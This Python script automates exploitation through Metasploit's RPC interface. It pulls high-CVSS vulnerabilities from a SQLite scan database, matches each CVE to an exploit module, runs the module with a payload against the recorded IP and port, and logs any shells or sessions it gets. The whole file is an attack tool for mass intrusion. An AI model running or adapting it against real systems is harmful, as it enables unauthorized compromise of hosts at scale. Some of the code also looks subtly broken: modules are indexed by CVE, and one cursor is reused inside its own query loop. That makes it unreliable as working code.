# Import modules
import metasploit.msfrpc
import sqlite3
import config

# Define exploit vulns function
def exploit_vulns(db_name):
    # Connect to a Metasploit RPC server
    client = metasploit.msfrpc.MsfRpcClient(config.msf_pass, server=config.msf_host, port=config.msf_port)

    # Connect to a SQLite database
    conn = sqlite3.connect(db_name)
    cur = conn.cursor()

    # Create a table for sessions
    cur.execute("""CREATE TABLE IF NOT EXISTS sessions (
        ip TEXT,
        port INTEGER,
        service TEXT,
        version TEXT,
        cve TEXT,
        cvss REAL,
        description TEXT,
        solution TEXT,
        session_id INTEGER,
        session_type TEXT,
        session_info TEXT,
        PRIMARY KEY (ip, port, cve)
        )""")

    # Query the database for vulnerabilities by CVE and CVSS
    for row in cur.execute("""SELECT * FROM vulnerabilities WHERE cve IS NOT NULL AND cvss >= ? ORDER BY cvss DESC""", (config.cvss_threshold,)):
        ip, port, service, version, cve, cvss, description, solution = row

        # Search for a Metasploit module that matches the CVE
        module = client.modules.exploits[cve]

        # If a module is found, configure its options and run it
        if module:
            options = module.options
            options['RHOSTS'] = ip
            options['RPORT'] = port

            # Run the module and get the result
            result = module.execute(payload=config.payload)

            # If a session is created, get its details and save them in the table
            if result['job_id']:
                session_id = result['session_id']
                session = client.sessions.list[session_id]
                session_type = session['type']
                session_info = session['info']
                cur.execute("""INSERT OR IGNORE INTO sessions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (ip, port, service, version, cve, cvss, description, solution, session_id, session_type, session_info))

    # Commit changes and close connection
    conn.commit()
    conn.close()
